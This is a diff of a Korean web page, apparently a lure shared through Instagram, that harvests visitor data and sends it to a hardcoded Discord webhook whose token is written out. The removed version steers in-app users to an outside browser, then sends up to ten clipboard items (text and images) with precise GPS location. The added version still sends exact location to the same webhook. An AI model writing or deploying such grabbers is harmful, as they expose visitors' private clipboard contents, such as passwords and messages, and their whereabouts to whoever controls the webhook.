@@ -1,185 +1,52 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>권한 요청 페이지</title>
-  <style>
-    body {
-      font-family: Arial;
-      text-align: center;
-      padding: 50px 20px;
-    }
-    .btn {
-      background: #5865F2;
-      color: white;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      margin: 10px;
-    }
-    .info {
-      background: #fff3cd;
-      padding: 15px;
-      border-radius: 8px;
-      margin: 20px 0;
-      text-align: left;
-    }
-  </style>
-</head>
-<body>
-  <h1>📋 클립보드 + 📍 위치 권한 요청</h1>
-  
-  <div class="info">
-    ⚠️ <strong>인스타그램에서는 권한이 차단됩니다.</strong><br>
-    아래 버튼을 눌러 <strong>외부 브라우저 (Chrome, Safari)</strong> 에서 여세요.
-  </div>
-  
-  <button class="btn" onclick="openInBrowser()">🌐 외부 브라우저에서 열기</button>
-  <br><br>
-  <button class="btn" style="background:#28a745" onclick="requestPermissions()">✅ 권한 허용하고 전송</button>
-  
-  <script>
-    // 인스타그램 인앱 브라우저 감지
-    function isInAppBrowser() {
-      const ua = navigator.userAgent || navigator.vendor || window.opera;
-      return /instagram/i.test(ua) || /FBAN/i.test(ua);
-    }
-    
-    function openInBrowser() {
-      // 현재 URL 을 외부 브라우저로 열기
-      const currentUrl = window.location.href;
-      window.location.href = currentUrl;
-      // 또는 특정 브라우저로 열기 (안드로이드)
-      // window.location.href = 'chrome://'+currentUrl;
-    }
-    
-    async function requestPermissions() {
-      if (isInAppBrowser()) {
-        alert('⚠️ 인스타그램에서는 권한이 차단됩니다!
+<button id="locationBtn">📍 위치 권한 허용하기</button>
 
-"외부 브라우저에서 열기" 버튼을 눌러주세요.');
-        return;
-      }
-      
-      try {
-        const clipboardItems = [];
-        const items = await navigator.clipboard.read();
-        let itemCount = 0;
-        
-        for (const item of items) {
-          if (itemCount >= 10) break;
-          const itemData = { index: itemCount + 1 };
-          
-          if (item.types.includes('text/plain')) {
-            const text = await item.getType('text/plain');
-            itemData.text = await text.text();
-          }
-          
-          const imageTypes = item.types.filter(type => type.startsWith('image/'));
-          if (imageTypes.length > 0) {
-            const imageBlob = await item.getType(imageTypes[0]);
-            itemData.image = imageBlob;
-            itemData.imageType = imageTypes[0];
-          }
-          
-          clipboardItems.push(itemData);
-          itemCount++;
-        }
-        
-        let locationData = '';
-        try {
-          const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            });
-          });
-          
-          const { latitude, longitude, accuracy } = position.coords;
-          locationData = `📍 **위치**: https://maps.google.com/?q=${latitude},${longitude}
+<script>
+document.getElementById('locationBtn').addEventListener('click', async () => {
+  try {
+    // 위치 정보 가져오기
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    });
+    
+    const { latitude, longitude, accuracy } = position.coords;
+    const locationData = `📍 **위치**: https://maps.google.com/?q=${latitude},${longitude}
 🗺️ **정확도**: ${accuracy}m`;
-        } catch (geoErr) {
-          locationData = '📍 **위치**: 권한 거부됨';
-        }
-        
-        await sendToDiscord(clipboardItems, locationData);
-        alert(`✅ ${clipboardItems.length}개 항목 + 위치 정보가 전송되었습니다!`);
-        
-      } catch (err) {
-        alert('권한을 모두 허용해주세요.
+    
+    // 디스코드로 전송
+    await sendToDiscord(locationData);
+    
+    alert('✅ 위치 정보가 전송되었습니다!');
+    
+  } catch (err) {
+    console.error('위치 오류:', err);
+    alert('📍 위치 권한을 허용해주세요.
 
 인스타그램 인앱 브라우저에서는 작동하지 않습니다.');
-      }
-    }
-    
-    async function sendToDiscord(items, locationData) {
-      const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
-      
-      let fullMessage = `📋 **클립보드 항목** (총 ${items.length}개)
+  }
+});
 
-`;
-      
-      items.forEach((item, idx) => {
-        fullMessage += `**📌 항목 ${item.index}**
-`;
-        
-        if (item.text) {
-          const displayText = item.text.length > 500 
-            ? item.text.substring(0, 500) + '... (전체는 파일로 첨부)' 
-            : item.text;
-          fullMessage += `**텍스트:**
-${displayText}
+async function sendToDiscord(locationData) {
+  // 디스코드 웹훅 URL (자신의 서버 웹훅으로 교체)
+  const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
+  
+  const fullMessage = `📍 **위치 정보**
 
-`;
-        }
-        
-        if (item.image) {
-          fullMessage += `**이미지:** (아래 첨부)
-`;
-        }
-        
-        fullMessage += `─────────────────
-`;
-      });
-      
-      fullMessage += `
 ${locationData}`;
-      
-      const formData = new FormData();
-      formData.append('content', fullMessage);
-      
-      items.forEach((item, idx) => {
-        if (item.image) {
-          const ext = item.imageType.split('/')[1] || 'png';
-          formData.append(`file${idx}`, item.image, `clipboard-${idx + 1}.${ext}`);
-        }
-      });
-      
-      const longTextItems = items.filter(item => item.text && item.text.length > 500);
-      if (longTextItems.length > 0) {
-        let allText = '';
-        longTextItems.forEach(item => {
-          allText += `=== 항목 ${item.index} ===
-${item.text}
-
-`;
-        });
-        const blob = new Blob([allText], { type: 'text/plain' });
-        formData.append('file_fulltext', blob, 'full-text.txt');
-      }
-      
-      const response = await fetch(webhookUrl, {
-        method: 'POST',
-        body: formData
-      });
-      
-      if (!response.ok) {
-        throw new Error('전송 실패');
-      }
-    }
-  </script>
-</body>
-</html>
+  
+  const formData = new FormData();
+  formData.append('content', fullMessage);
+  
+  const response = await fetch(webhookUrl, {
+    method: 'POST',
+    body: formData
+  });
+  
+  if (!response.ok) {
+    throw new Error('전송 실패');
+  }
+}
+</script>
